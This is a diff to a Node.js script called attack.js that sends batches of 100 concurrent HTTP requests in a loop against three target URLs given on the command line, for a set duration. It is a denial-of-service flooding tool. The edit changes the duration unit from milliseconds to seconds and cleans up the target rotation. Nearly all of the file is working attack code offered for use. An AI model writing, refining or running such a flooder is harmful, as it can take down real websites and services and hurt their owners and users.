@@ -3,18 +3,18 @@ const axios = require('axios');
 const target1 = process.argv[2];
 const target2 = process.argv[3];
 const target3 = process.argv[4];
-const duration = parseInt(process.argv[5]); // in ms
+const durationSeconds = parseInt(process.argv[5]); // in SECONDS
 
-if (!target1 || !target2 || !target3 || isNaN(duration) || duration <= 0 || duration > 500000) {
-  console.error('Usage: node attack.js <target1> <target2> <target3> <duration_in_ms>');
+if (!target1 || !target2 || !target3 || isNaN(durationSeconds) || durationSeconds <= 0 || durationSeconds > 500000) {
+  console.error('Usage: node attack.js <target1> <target2> <target3> <duration_in_seconds>');
   process.exit(1);
 }
 
 const MAX_TIMEOUT = 25000;
 const CONCURRENT_REQUESTS = 100;
+const targets = [target1, target2, target3];
 
 let isRunning = true;
-const targets = [target1, target2, target3];
 
 async function sendRequest(url, id) {
   try {
@@ -32,7 +32,7 @@ async function attackLoop() {
     const batch = [];
 
     for (let i = 0; i < CONCURRENT_REQUESTS; i++) {
-      const url = targets[i % 3]; // Rotate between targets
+      const url = targets[i % targets.length]; // rotate through targets
       requestCount++;
       batch.push(sendRequest(url, requestCount));
     }
@@ -41,11 +41,10 @@ async function attackLoop() {
   }
 }
 
-// Stop attack after duration
+// Auto-stop after duration (converted to ms)
 setTimeout(() => {
-  console.log(`Finished attack after ${duration}ms`);
+  console.log(`Attack finished after ${durationSeconds} seconds`);
   isRunning = false;
-}, duration);
+}, durationSeconds * 1000);
 
-// Start the attack
 attackLoop();
